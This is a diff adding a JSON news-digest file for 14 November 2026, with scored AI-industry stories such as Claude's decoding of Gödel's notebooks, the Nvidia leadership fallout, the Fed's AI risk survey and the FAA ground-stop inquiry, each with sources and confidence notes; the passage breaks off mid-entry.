@@ -1,0 +1,1572 @@
+{
+  "date": "2026-11-14",
+  "window": {
+    "start": "2026-11-13T21:48:00Z",
+    "end": "2026-11-14T21:48:00Z"
+  },
+  "tldr": [
+    "Claude produced a ~650-page analysis of Kurt Gödel's shorthand notebooks in days, identifying 663 theorems with proofs or sketches, about 400 of them since checked without corrections. The Helsinki team had been transcribing at about a page a week.",
+    "The Nvidia fallout widened: Altimeter and Atreides (~$2.13B stake) asked the board to keep Huang's return open, Musk backed a 100,000-signature petition, and bipartisan senators pressed Commerce Secretary Lutnick over the export-control loopholes Megaspeed allegedly used.",
+    "The Fed's Financial Stability Report found 87% of surveyed market contacts now name AI as a top risk (up from 50% in spring), citing $680B of AI-compute debt issuance. The FAA is also examining whether a newly expanded AI traffic tool played a role in Thursday's nationwide ground stop."
+  ],
+  "items": [
+    {
+      "id": "claude-godel-notebooks-663-theorems",
+      "title": "Claude helps decode Gödel's shorthand notebooks, finding 663 theorems with proofs or sketches",
+      "summary": "Since 2017, Jan von Plato's University of Helsinki project has been transcribing 16 notebooks Kurt Gödel wrote in the early 1940s, mostly in the obsolete Gabelsberger shorthand. The team had been working at about a page a week. Then, in September, Anthropic's Claude produced a roughly 650-page analysis within days. It identified 663 theorems for which Gödel had a proof, a sketch or an outline, and about 400 of them were later checked without corrections. The notebooks suggest Gödel came within one step of the independence of the axiom of choice, which Paul Cohen proved in 1963.",
+      "why_it_matters": "This is a concrete case of a frontier model speeding up archival and mathematical scholarship by orders of magnitude. It also raises an open attribution question: how much of the result is Gödel's work and how much is the model's repair of gaps.",
+      "key_numbers": [
+        "663 theorems identified",
+        "~400 verified without corrections",
+        "~650-page analysis produced in days",
+        "16 notebooks"
+      ],
+      "topic": "research",
+      "region": "eu",
+      "entities": [
+        "Anthropic",
+        "University of Helsinki",
+        "Institute for Advanced Study"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T17:30:00Z",
+      "sources": [
+        {
+          "url": "https://www.theguardian.com/science/2026/nov/13/kurt-godel-notebooks-ai-helps-unlock-hidden-discoveries-man-who-transformed-maths",
+          "outlet": "The Guardian",
+          "lang": "en",
+          "tier": "press",
+          "title": "'Ahead of his time': AI helps unlock discoveries hidden in notebooks of man who transformed maths"
+        },
+        {
+          "url": "https://www.ias.edu/news/ahead-his-time-ai-helps-unlock-discoveries-hidden-notebooks-man-who-transformed-maths",
+          "outlet": "Institute for Advanced Study",
+          "lang": "en",
+          "tier": "primary",
+          "title": "\"Ahead of His Time\": AI Helps Unlock Discoveries Hidden in Notebooks of Man Who Transformed Maths"
+        },
+        {
+          "url": "https://www.geo.tv/latest/691011-ai-unlocks-80-year-old-secrets-of-einsteins-friend-uncovers-hundreds-of-mathematical-discoveries",
+          "outlet": "Geo News",
+          "lang": "en",
+          "tier": "press",
+          "title": "AI unlocks 80-year-old secrets of Einstein's friend, uncovers hundreds of mathematical discoveries"
+        }
+      ],
+      "coverage": 6,
+      "impact": 0.5,
+      "novelty": 0.8,
+      "follow_up_of": null,
+      "confidence_note": "The Guardian published about 4.3h before the window opens. The time is taken from the HN first-seen time (17:30Z). Sources disagree on the verification method: one blog says the ~400 theorems were checked in Coq, which is unconfirmed. The IAS page appears to repost the Guardian story. The figures come from snippets only.",
+      "score": {
+        "total": 68.0,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.8,
+          "credibility": 0.879,
+          "breadth": 0.632,
+          "momentum": 0.744
+        },
+        "coverage": 6,
+        "mentions": 5,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "lead",
+      "rank": 1
+    },
+    {
+      "id": "nvidia-altimeter-atreides-letter-musk-petition-huang-return",
+      "title": "Altimeter and Atreides urge Nvidia board to keep Huang's return open; Musk backs 100,000-signature petition",
+      "summary": "Altimeter Capital's Brad Gerstner and Atreides Management's Gavin Baker, whose funds reported about 10.66M Nvidia shares (~$2.13B) as of June 30, sent the board a letter asking for a slow, deliberate CEO search that leaves room for Jensen Huang's return. They did not ask for immediate reinstatement and said interim CEO Colette Kress can lead capably. Separately, Elon Musk said on X that Nvidia will lose 'critical' supply deals because many were 'a handshake with Jensen, not a written contract', and said he was signing a 'Stand with Jensen' petition that passed 100,000 signatures, including more than 5,000 people who say they work at Nvidia. On Nov 13 the board told CNBC it had not yet hired a search firm for a permanent successor.",
+      "why_it_matters": "Big holders, staff and customers are pushing back two days after the resignation. That leaves the succession question open going into Nvidia's Nov 17 earnings, the first under Kress.",
+      "key_numbers": [
+        "~$2.13B combined stake (10.66M shares, June 30 13F)",
+        "100,000+ petition signatures",
+        "5,000+ self-identified Nvidia staff"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Nvidia",
+        "Altimeter Capital",
+        "Atreides Management",
+        "Elon Musk",
+        "Jensen Huang",
+        "Colette Kress"
+      ],
+      "tickers": [
+        "NVDA"
+      ],
+      "published_at": "2026-11-14T15:08:32Z",
+      "sources": [
+        {
+          "url": "https://www.cnbc.com/2026/11/14/nvidia-investors-jensen-huang-return-board-letter.html",
+          "outlet": "CNBC",
+          "lang": "en",
+          "tier": "press",
+          "title": "Nvidia board urged to consider 'potential return of Jensen Huang' by two major investors"
+        },
+        {
+          "url": "https://www.dawn.com/news/2044511/musk-says-nvidia-will-lose-critical-deals-without-jensen-huang",
+          "outlet": "Dawn (Reuters)",
+          "lang": "en",
+          "tier": "press",
+          "title": "Musk says Nvidia will lose 'critical' deals without Jensen Huang"
+        },
+        {
+          "url": "https://finance.yahoo.com/markets/stocks/articles/elon-musk-joins-100-000-172500045.html",
+          "outlet": "Business Insider (via Yahoo Finance)",
+          "lang": "en",
+          "tier": "press",
+          "title": "Elon Musk joins 100,000+ signers on a petition to reinstate Jensen Huang — including 5,000+ who say they work at Nvidia"
+        },
+        {
+          "url": "https://www.mediaite.com/media/news/elon-musk-says-critical-deals-will-be-lost-without-jensen-huang-while-more-than-60000-nvidia-shareholders-plead-to-bring-jensen-back/",
+          "outlet": "Mediaite",
+          "lang": "en",
+          "tier": "press",
+          "title": "Elon Musk Says 'Critical Deals' Will Be Lost Without Jensen Huang — While More Than 60,000 Nvidia Shareholders Plead to 'Bring Jensen Back'"
+        },
+        {
+          "url": "https://wccftech.com/elon-musk-warns-nvidia-lose-critical-supply-deals-without-jensen-huang/",
+          "outlet": "Wccftech",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Elon Musk Praises Jensen Huang's Reliability On Compute Deliveries, \"Without Jensen, At Least Some Of Those Critical Deals Will Be Lost\""
+        }
+      ],
+      "coverage": 9,
+      "impact": 0.6,
+      "novelty": 0.6,
+      "follow_up_of": "nvidia-huang-resigns-kress-interim-ceo-jones-chair",
+      "confidence_note": "published_at is Reuters' Musk story (harvest timestamp). The investor letter was reportedly sent Friday Nov 13 and posted on X, exact time unknown; CNBC reported it at 17:35Z Nov 14. Petition counts differ by outlet (about 100,000-112,000; Mediaite cites a 'Bring Jensen Back' petition with about 60,000 self-described shareholders). Signatures and Nvidia affiliation are self-reported. 'No search firm' comes from the CNBC headline of Nov 13 19:18Z. All facts are from search snippets; CNBC could not be fetched.",
+      "score": {
+        "total": 67.4,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.6,
+          "credibility": 0.834,
+          "breadth": 0.777,
+          "momentum": 0.608
+        },
+        "coverage": 9,
+        "mentions": 5,
+        "baseline": 4.333,
+        "verified": true
+      },
+      "placement": "lead",
+      "rank": 2
+    },
+    {
+      "id": "fed-fsr-nov-2026-ai-top-financial-stability-risk",
+      "title": "Fed Financial Stability Report: 87% of surveyed market contacts now name AI as a top risk",
+      "summary": "The Federal Reserve's November 2026 Financial Stability Report, released Nov 13, found that 87% of the 23 market contacts surveyed named AI as a salient risk, up from 50% in spring 2026 and 30% in fall 2025. The concerns fall into three groups: stretched equity valuations, AI-enabled cyber risk, and complex AI-infrastructure financing. The report puts debt issuance tied to advanced computing at $680B by October 2026 and says not-yet-commenced debt, guarantees and leases on AI infrastructure could exceed $3T. It also flags hedge-fund leverage at its highest since 2013.",
+      "why_it_matters": "US bank regulators now treat AI data-centre financing as a system-level risk. The report lands in a week when Nvidia's guarantees and the Anthropic IPO dominate markets.",
+      "key_numbers": [
+        "87% of 23 contacts (vs 50% spring)",
+        "$680B AI-compute debt issuance",
+        "> $3T uncommenced debt, guarantees, leases"
+      ],
+      "topic": "policy",
+      "region": "us",
+      "entities": [
+        "Federal Reserve"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T22:26:58Z",
+      "sources": [
+        {
+          "url": "https://www.federalreserve.gov/publications/files/financial-stability-report-20261113.pdf",
+          "outlet": "Federal Reserve",
+          "lang": "en",
+          "tier": "primary",
+          "title": "Financial Stability Report November 2026"
+        },
+        {
+          "url": "https://www.cnbc.com/2026/11/13/ai-risks-financial-system-federal-reserve.html",
+          "outlet": "CNBC",
+          "lang": "en",
+          "tier": "press",
+          "title": "AI risks are the biggest threat to the financial system, Fed survey finds"
+        },
+        {
+          "url": "https://1027wbow.com/2026/11/13/ai-rockets-to-top-of-worries-about-financial-system-in-latest-fed-survey/",
+          "outlet": "Reuters (via WBOW)",
+          "lang": "en",
+          "tier": "press",
+          "title": "AI rockets to top of worries about financial system in latest Fed survey"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.6,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "The Fed PDF was posted Nov 13; its exact posting time is unknown and likely shortly before the window. published_at uses the Reuters harvest timestamp. Figures come from search snippets of the report and coverage; the PDF was not opened. The survey reflects market contacts' views, not the Fed Board's.",
+      "score": {
+        "total": 65.4,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.6,
+          "credibility": 0.879,
+          "breadth": 0.565,
+          "momentum": 0.632
+        },
+        "coverage": 5,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "lead",
+      "rank": 3
+    },
+    {
+      "id": "lutnick-pressure-curtis-letter-blumenthal-cantor-ties",
+      "title": "Pressure on Lutnick mounts: bipartisan senators' letter, Blumenthal says he 'must go', CNBC details Cantor's Nvidia ties",
+      "summary": "Sens. John Curtis (R-UT) and Lisa Blunt Rochester (D-DE) wrote to Commerce Secretary Howard Lutnick on Nov 13 demanding he close AI-chip export-control loopholes and explain his handling of the Megaspeed probe. Sen. Richard Blumenthal said Lutnick 'must go'. A CNBC analysis found that Cantor Fitzgerald, now run by Lutnick's sons, cut its reported Nvidia share count by nearly half between September 2025 and March 2026 while keeping extensive business ties to the chipmaker; CNBC found no evidence of improper influence. Senate Banking chair Tim Scott has asked Lutnick to testify on Dec 10 and Huang on Dec 3.",
+      "why_it_matters": "Criticism of Commerce's export-control record is now bipartisan. That makes tighter chip rules, such as the pending remote-access rule, and personnel changes at Commerce more likely before Democrats take Congress in January.",
+      "key_numbers": [
+        "Cantor's Nvidia shares down ~49% (Sep 2025-Mar 2026)",
+        "1.78M shares at end-March 2026",
+        "Dec 10 requested testimony"
+      ],
+      "topic": "policy",
+      "region": "us",
+      "entities": [
+        "US Department of Commerce",
+        "Howard Lutnick",
+        "Cantor Fitzgerald",
+        "Nvidia",
+        "US Senate"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T18:32:47Z",
+      "sources": [
+        {
+          "url": "https://www.curtis.senate.gov/newsroom/press-releases/curtis-blunt-rochester-demand-stronger-ai-chip-export-controls/",
+          "outlet": "Office of Sen. John Curtis",
+          "lang": "en",
+          "tier": "primary",
+          "title": "Curtis, Blunt Rochester Demand Stronger AI Chip Export Controls"
+        },
+        {
+          "url": "https://www.cnbc.com/2026/11/13/howard-lutnick-nvidia-jensen-huang-china-cantor-fitzgerald.html",
+          "outlet": "CNBC",
+          "lang": "en",
+          "tier": "press",
+          "title": "Lutnick faces questions over Nvidia spy scandal. His sons' firm has deep ties to the chipmaker"
+        },
+        {
+          "url": "https://www.newsnationnow.com/politics/lutnick-must-go-following-nvidia-scandal-says-blumenthal/",
+          "outlet": "NewsNation",
+          "lang": "en",
+          "tier": "press",
+          "title": "Lutnick 'must go' following Nvidia scandal, says Blumenthal"
+        },
+        {
+          "url": "https://www.deseret.com/politics/2026/11/13/john-curtis-demands-answers-after-nvidia-scandal/",
+          "outlet": "Deseret News",
+          "lang": "en",
+          "tier": "press",
+          "title": "Curtis demands answers from Lutnick after delaying a ban on Nvidia chip exports to China"
+        },
+        {
+          "url": "https://www.washingtontimes.com/news/2026/nov/13/sen-tim-scott-demands-testimony-lutnick-huang-nvidia-revelations/",
+          "outlet": "The Washington Times",
+          "lang": "en",
+          "tier": "press",
+          "title": "Sen. Tim Scott demands testimony from Lutnick, Huang after Nvidia revelations"
+        }
+      ],
+      "coverage": 8,
+      "impact": 0.6,
+      "novelty": 0.5,
+      "follow_up_of": "bessent-blames-lutnick-commerce-megaspeed-entity-list",
+      "confidence_note": "published_at is CNBC's Cantor story at 18:32Z Nov 13, about 3h before the window. The Curtis letter (Nov 13) and Blumenthal's call (Friday Nov 13; The Hill picked it up at 20:33Z Nov 14) fall around the window edge. The Dec 3 and Dec 10 dates are requested, not confirmed. Facts come from search snippets.",
+      "score": {
+        "total": 64.5,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.5,
+          "credibility": 0.879,
+          "breadth": 0.736,
+          "momentum": 0.487
+        },
+        "coverage": 8,
+        "mentions": 1,
+        "baseline": 0.5,
+        "verified": true
+      },
+      "placement": "lead",
+      "rank": 4
+    },
+    {
+      "id": "faa-ground-stop-ai-tool-smart-under-scrutiny",
+      "title": "FAA examines whether new AI air-traffic tool played a role in nationwide ground stop; Duffy says it did not",
+      "summary": "The FAA halted departures nationwide on Nov 13 after a communications failure at its air-traffic control centres, three days after it expanded SMART, an AI traffic-management advisory tool from Air Space Intelligence, to all 22 en-route centres. Federal officials said they were examining whether the tool contributed. Transportation Secretary Sean Duffy and the vendor said SMART is not connected to core radar and flight-tracking systems and could not have caused the outage. Bloomberg reported that the FBI does not suspect a cyberattack and is looking at whether a software update was to blame.",
+      "why_it_matters": "It is the first big public test of AI tools in safety-critical federal infrastructure. Even if the tool is cleared, the episode is likely to feed scrutiny of the agency's AI rollouts.",
+      "key_numbers": [
+        "22 en-route centres",
+        "SMART expanded 3 days before outage"
+      ],
+      "topic": "policy",
+      "region": "us",
+      "entities": [
+        "Federal Aviation Administration",
+        "Air Space Intelligence",
+        "US Department of Transportation",
+        "FBI"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T22:57:09Z",
+      "sources": [
+        {
+          "url": "https://www.click2houston.com/news/local/2026/11/13/faa-investigating-whether-new-ai-technology-contributed-to-nationwide-ground-stop/",
+          "outlet": "KPRC Click2Houston (AP)",
+          "lang": "en",
+          "tier": "press",
+          "title": "FAA investigating whether new AI technology contributed to nationwide ground stop"
+        },
+        {
+          "url": "https://www.washingtontimes.com/news/2026/nov/13/faa-expanded-ai-air-traffic-tool-centers-days-nationwide-ground-stop/",
+          "outlet": "The Washington Times",
+          "lang": "en",
+          "tier": "press",
+          "title": "Duffy says FAA's new AI air traffic tool played no role in nationwide ground stop"
+        },
+        {
+          "url": "https://www.bloomberg.com/news/articles/2026-11-13/fbi-said-to-probe-whether-software-update-caused-mass-faa-outage",
+          "outlet": "Bloomberg",
+          "lang": "en",
+          "tier": "press",
+          "title": "FBI Said to Probe Whether Software Update Caused Mass FAA Outage"
+        },
+        {
+          "url": "https://www.yahoo.com/news/us/articles/nationwide-ground-stop-happened-just-225837585.html",
+          "outlet": "Yahoo News",
+          "lang": "en",
+          "tier": "press",
+          "title": "Nationwide ground stop happened just as FAA rolled out new AI tool"
+        }
+      ],
+      "coverage": 7,
+      "impact": 0.5,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "The ground stop began around 21:00Z Nov 13 (HN post 21:06Z), just before the window; the AI angle surfaced from 22:57Z. No cause had been confirmed.",
+      "score": {
+        "total": 62.8,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.6,
+          "credibility": 0.834,
+          "breadth": 0.689,
+          "momentum": 0.632
+        },
+        "coverage": 7,
+        "mentions": 1,
+        "baseline": 0.0,
+        "verified": true
+      },
+      "placement": "lead",
+      "rank": 5
+    },
+    {
+      "id": "anthropic-ipo-demand-durability-doubts-china-orders-rebuffed",
+      "title": "Anthropic IPO draws strong demand but investors question durability of its lead; China and Hong Kong orders rebuffed",
+      "summary": "A Reuters exclusive says institutional demand for Anthropic's roughly $64B IPO is running ahead of SpaceX's early roadshow, with single-digit oversubscription. Investors are probing whether Claude can hold its lead beyond coding as Google catches up and whether premium pricing survives comparable rival models. One investor who skipped the deal holds a view about 30% below sell-side 2028 estimates. Bloomberg reports that syndicate banks are refusing or discouraging orders from mainland China and Hong Kong institutions, citing US ITAR concerns, as SpaceX's IPO did. Pricing is expected Nov 18.",
+      "why_it_matters": "How the book is built shapes where Anthropic prices relative to the $70-$78 range and how the shares trade after listing. Excluding China also makes national-security screening a feature of frontier-AI listings.",
+      "key_numbers": [
+        "~$64B IPO",
+        "single-digit oversubscription",
+        "~30% below sell-side 2028 view (one investor)",
+        "pricing expected Nov 18"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Anthropic"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T23:30:00Z",
+      "sources": [
+        {
+          "url": "https://www.thestar.com.my/tech/tech-news/2026/11/14/exclusive-investors-flock-to-anthropic-ipo-but-question-durability-of-ai-lead",
+          "outlet": "Reuters (via The Star)",
+          "lang": "en",
+          "tier": "press",
+          "title": "Exclusive-Investors flock to Anthropic IPO but question durability of AI lead"
+        },
+        {
+          "url": "https://www.bloomberg.com/news/articles/2026-11-13/anthropic-ipo-share-orders-from-china-are-said-to-be-rebuffed",
+          "outlet": "Bloomberg",
+          "lang": "en",
+          "tier": "press",
+          "title": "Anthropic IPO Share Orders From China Are Said to Be Rebuffed"
+        },
+        {
+          "url": "https://finance.yahoo.com/markets/stocks/articles/anthropic-ipo-reportedly-closed-china-174510000.html",
+          "outlet": "Stocktwits (via Yahoo Finance)",
+          "lang": "en",
+          "tier": "trade",
+          "title": "Anthropic IPO Reportedly Closed To China, Hong Kong Buyers, Mirroring SpaceX Playbook"
+        },
+        {
+          "url": "https://www.businessday.co.za/companies/2026-11-14-investors-flock-to-anthropic-ipo-but-question-durability-of-ai-lead/",
+          "outlet": "BusinessDay",
+          "lang": "en",
+          "tier": "press",
+          "title": "Investors flock to Anthropic IPO but question durability of AI lead"
+        }
+      ],
+      "coverage": 6,
+      "impact": 0.6,
+      "novelty": 0.4,
+      "follow_up_of": "anthropic-ipo-six-times-oversubscribed-nvidia-pledge-scrutiny",
+      "confidence_note": "published_at is the harvest timestamp of the Reuters exclusive. The Bloomberg China story is stamped 15:37Z Nov 13, about 6h10m before the window, so it is only marginally outside the 6h tolerance and the editor may drop it. Oversubscription is 'single digits' per Reuters; earlier reports said about 6x. Facts come from syndicated snippets; Anthropic declined to comment.",
+      "score": {
+        "total": 62.6,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.4,
+          "credibility": 0.834,
+          "breadth": 0.632,
+          "momentum": 0.744
+        },
+        "coverage": 6,
+        "mentions": 5,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 6
+    },
+    {
+      "id": "reuters-huang-misled-nvidia-general-counsel-alice-huang",
+      "title": "Reuters: Huang misled Nvidia's general counsel and other leaders about his relationship with Megaspeed executive",
+      "summary": "Citing two people familiar with the matter and internal messages from October, Reuters reports that Jensen Huang misled senior Nvidia leaders, including general counsel Tim Teter and CMO Alison Wagonfeld, about his relationship with Megaspeed executive Alice Huang. He reportedly described his dealings with her as routine while having an affair with her. Nvidia told Bloomberg that Teter did not know of the affair when he contacted Commerce export agents about the Megaspeed probe in August 2025.",
+      "why_it_matters": "The report bears on what Nvidia's legal team knew when it stepped into the US smuggling probe. That is central to the board's Wachtell review, the shareholder class action and congressional inquiries.",
+      "key_numbers": [
+        "2 sources plus internal messages (October)"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Nvidia",
+        "Jensen Huang",
+        "Megaspeed",
+        "Alice Huang",
+        "Tim Teter"
+      ],
+      "tickers": [
+        "NVDA"
+      ],
+      "published_at": "2026-11-14T00:26:00Z",
+      "sources": [
+        {
+          "url": "https://finance.yahoo.com/markets/stocks/articles/exclusive-ex-nvidia-ceo-misled-002638424.html",
+          "outlet": "Reuters (via Yahoo Finance)",
+          "lang": "en",
+          "tier": "press",
+          "title": "Exclusive-Ex-Nvidia CEO misled top lawyer on affair with Chinese businesswoman, sources say"
+        },
+        {
+          "url": "https://tribune.com.pk/story/2640308/ex-nvidia-ceo-misled-top-lawyer-on-affair-with-chinese-businesswoman-sources-say",
+          "outlet": "The Express Tribune",
+          "lang": "en",
+          "tier": "press",
+          "title": "Ex-Nvidia CEO misled top lawyer on affair with Chinese businesswoman, sources say"
+        },
+        {
+          "url": "https://www.lbc.co.uk/article/former-nvidia-ceo-jensen-huang-misled-top-lawyer-5HjdmN6_2/",
+          "outlet": "LBC",
+          "lang": "en",
+          "tier": "press",
+          "title": "Former Nvidia CEO Jensen Huang misled top lawyer on affair with Chinese businesswoman, sources say"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.6,
+      "novelty": 0.5,
+      "follow_up_of": "nvidia-board-hires-wachtell-joon-kim-huang-probe",
+      "confidence_note": "published_at is estimated from the Yahoo syndication URL (about 00:26Z Nov 14; Reuters dated it Nov 13 US time). The harvest's Google News copy is stamped 13:19Z. Details come from search snippets of syndicated copies; Reuters did not quote the messages verbatim, and no Nvidia or Huang response was seen.",
+      "score": {
+        "total": 62.2,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.5,
+          "credibility": 0.834,
+          "breadth": 0.565,
+          "momentum": 0.608
+        },
+        "coverage": 5,
+        "mentions": 5,
+        "baseline": 4.333,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 7
+    },
+    {
+      "id": "openai-disbands-standalone-robotics-team",
+      "title": "OpenAI disbands its standalone robotics team, betting general models like GPT-6 Astra can run robots",
+      "summary": "Fortune reported in an exclusive that OpenAI has broken up its standalone robotics team. The robotics researchers now report to Chief Research Officer Mark Chen in the main research organisation, and the applied robotics and hardware staff have moved to the Applied group under President Greg Brockman. OpenAI says general frontier models such as GPT-6 Astra can now control robots directly, without robot-specific training. It told Fortune that robotics stays core to its long-term plans and that a humanoid demo is still targeted for 2027.",
+      "why_it_matters": "A top lab is betting that a separate robot-foundation-model team is unnecessary, which puts pressure on robotics-model startups whose pitch is a specialised robot brain. It is also OpenAI's second robotics reorganisation, after it wound down an earlier team in 2020.",
+      "key_numbers": [
+        "74.8% vs 51.0% simulated manipulation success (GPT-6 Astra agent vs best specialised robot model, as reported)",
+        "Humanoid demo targeted for 2027"
+      ],
+      "topic": "research",
+      "region": "us",
+      "entities": [
+        "OpenAI"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-13T17:05:00Z",
+      "sources": [
+        {
+          "url": "https://fortune.com/2026/11/13/openai-disbands-robotics-team-as-its-general-models-start-running-robots/",
+          "outlet": "Fortune",
+          "lang": "en",
+          "tier": "press",
+          "title": "Exclusive: OpenAI disbands its stand-alone robotics team as its general-purpose AI models start running robots"
+        },
+        {
+          "url": "https://casrai.org/news/openai-disbands-robotics-team-2026",
+          "outlet": "CASRAI",
+          "lang": "en",
+          "tier": "trade",
+          "title": "OpenAI Disbands Its Robotics Team: What It Means"
+        },
+        {
+          "url": "https://businessupturn.com/technology/openai-disbands-robotics-team-and-moves-staff-into-wider-ai-groups/",
+          "outlet": "Business Upturn",
+          "lang": "en",
+          "tier": "trade",
+          "title": "OpenAI disbands robotics team and moves staff into wider AI groups"
+        }
+      ],
+      "coverage": 7,
+      "impact": 0.6,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "Fortune ran this at 17:05Z on Nov 13, about 4.7h before the window opens; The Decoder, CASRAI and Chinese outlets followed on Nov 14. The facts come from search snippets of the Fortune piece, because WebFetch is blocked. The 74.8% vs 51.0% figure (an Nvidia-run simulated test, reportedly on RoboLab-120) appeared in only one snippet summary. Fortune did not give a team headcount.",
+      "score": {
+        "total": 61.3,
+        "components": {
+          "impact": 0.6,
+          "novelty": 0.6,
+          "credibility": 0.691,
+          "breadth": 0.689,
+          "momentum": 0.42
+        },
+        "coverage": 7,
+        "mentions": 2,
+        "baseline": 2.667,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 8
+    },
+    {
+      "id": "amazon-world-product-graph-ai-shopping-agents",
+      "title": "Reuters: Amazon drafts 'World Product Graph' to index every product online and blunt outside AI shopping agents",
+      "summary": "According to an internal document seen by Reuters, Amazon is weighing a 'World Product Graph': a database of every product sold on the internet, including items Amazon does not sell, surfaced through its own site. The aim is to stop shoppers and AI agents from leaving Amazon for product research, and to improve its own shopping assistant's accuracy while letting it run on cheaper models. The press-release-style document sets an aspirational launch date of Oct 1, 2027. Amazon said a brainstorming document 'doesn't necessarily reflect our current plans'.",
+      "why_it_matters": "This is Amazon's counter to agentic commerce pushes such as ChatGPT Wallet. Owning the product index would force third-party agents to route through Amazon.com.",
+      "key_numbers": [
+        "Aspirational launch date: Oct 1, 2027"
+      ],
+      "topic": "business",
+      "region": "us",
+      "entities": [
+        "Amazon"
+      ],
+      "tickers": [
+        "AMZN"
+      ],
+      "published_at": "2026-11-13T23:49:11Z",
+      "sources": [
+        {
+          "url": "https://www.theverge.com/tech/1033697/amazon-world-product-graph-ai-search",
+          "outlet": "The Verge",
+          "lang": "en",
+          "tier": "press",
+          "title": "Amazon has a plan to index the world's online shopping data"
+        },
+        {
+          "url": "https://lufkindailynews.com/news_reuters/business/exclusive-amazon-s-plan-to-own-the-world-s-product-data-and-fight-ai-shopping/article_d440d459-a334-59f4-a921-af72be6f3f8b.html",
+          "outlet": "Reuters (via Lufkin Daily News)",
+          "lang": "en",
+          "tier": "press",
+          "title": "Exclusive-Amazon's plan to own the world's product data and fight AI shopping agents"
+        },
+        {
+          "url": "https://www.thenews.com.pk/latest/1423566-amazon-to-own-worlds-product-data-and-counter-rival-ai-agents-to-dominate-retail-markets-report",
+          "outlet": "The News International",
+          "lang": "en",
+          "tier": "press",
+          "title": "Amazon to own world's product data and counter rival AI agents to dominate retail markets: report"
+        },
+        {
+          "url": "https://tech.slashdot.org/story/26/11/14/0226222/amazons-plan-to-index-the-worlds-online-shopping-data",
+          "outlet": "Slashdot",
+          "lang": "en",
+          "tier": "social",
+          "title": "Amazon's Plan to Index the World's Online Shopping Data"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.5,
+      "novelty": 0.6,
+      "follow_up_of": null,
+      "confidence_note": "The published_at is The Verge's time, the earliest seen. The Reuters exclusive came out earlier on Nov 13, but its exact time and reuters.com URL were not found, so the Reuters text is cited via a syndication copy. This is a draft plan; Reuters could not determine whether or when it will be implemented.",
+      "score": {
+        "total": 59.9,
+        "components": {
+          "impact": 0.5,
+          "novelty": 0.6,
+          "credibility": 0.834,
+          "breadth": 0.565,
+          "momentum": 0.528
+        },
+        "coverage": 5,
+        "mentions": 1,
+        "baseline": 0.333,
+        "verified": true
+      },
+      "placement": "brief",
+      "rank": 9
+    },
+    {
+      "id": "asian-governments-react-huang-exit-korea-260k-gpus",
+      "title": "Asian governments react to Huang exit: Korea says Nvidia reaffirmed 260,000-GPU supply; Malaysia drafts data-centre law",
+      "summary": "South Korea's science ministry said Nvidia reaffirmed its plan to supply 260,000 advanced GPUs, and the government's AI strategy council held an emergency meeting. Japan's industry ministry said it is monitoring Nvidia closely. Singapore said its probe into Megaspeed and six other individuals continues, and Taipei said Nvidia's planned Taiwan headquarters remains on track. Malaysia's trade minister is drafting a law that would make data-centre operators disclose GPU counts, locations and power use to stop chips being re-exported.",
+      "why_it_matters": "Sovereign-AI buyers are seeking reassurance that supply commitments survive the leadership change. Meanwhile Southeast Asian transshipment hubs are tightening the rules that Megaspeed allegedly exploited.",
+      "key_numbers": [
+        "260,000 GPUs (Korea pledge)",
+        "Singapore probe: Megaspeed + 6 individuals",
+        "55 of 117 approved Malaysian DC projects operating"
+      ],
+      "topic": "compute",
+      "region": "other",
+      "entities": [
+        "Nvidia",
+        "South Korea Ministry of Science and ICT",
+        "Malaysia MITI",
+        "Singapore Ministry of Home Affairs",
+        "Megaspeed"
+      ],
+      "tickers": [],
+      "published_at": "2026-11-14T16:34:15Z",
+      "sources": [
+        {
+          "url": "https://techcrunch.com/2026/11/14/asian-governments-react-to-nvidia-ceo-jensen-huangs-exit/",
+          "outlet": "TechCrunch",
+          "lang": "en",
+          "tier": "press",
+          "title": "Asian governments react to Nvidia CEO Jensen Huang's exit"
+        },
+        {
+          "url": "https://www.tomshardware.com/tech-industry/artificial-intelligence/malaysia-plans-new-law-using-data-center-power-consumption-to-catch-ai-gpu-smugglers-but-real-world-tdp-variance-and-lack-of-physical-audits-could-undermine-it-new-law-also-forces-operators-to-pay-for-unused-electricity-capacity",
+          "outlet": "Tom's Hardware",
+          "lang": "en",
+          "tier": "press",
+          "title": "Malaysia plans new law using data center power consumption to catch AI GPU smugglers"
+        },
+        {
+          "url": "https://theedgemalaysia.com/node/825488",
+          "outlet": "The Edge Malaysia",
+          "lang": "en",
+          "tier": "press",
+          "title": "Johari: New law to tighten data centre oversight, prevent chip transshipment"
+        }
+      ],
+      "coverage": 5,
+      "impact": 0.5,
+      "novelty": 0.5,
+      "follow_up_of": "nvidia-huang-resigns-kress-interim-ceo-jones-chair",
+      "confidence_note": "The Malaysian minister first announced the draft law on Nov 12 (outside the window). Tom's Hardware's Nov 14 piece is the in-window write-up; the bill has no number or timetable yet. The Korea figure comes via TechCrunch's roundup; the ministry statement itself was not seen.",
+      "score": {
+        "total": 58.7,
+        "components": {
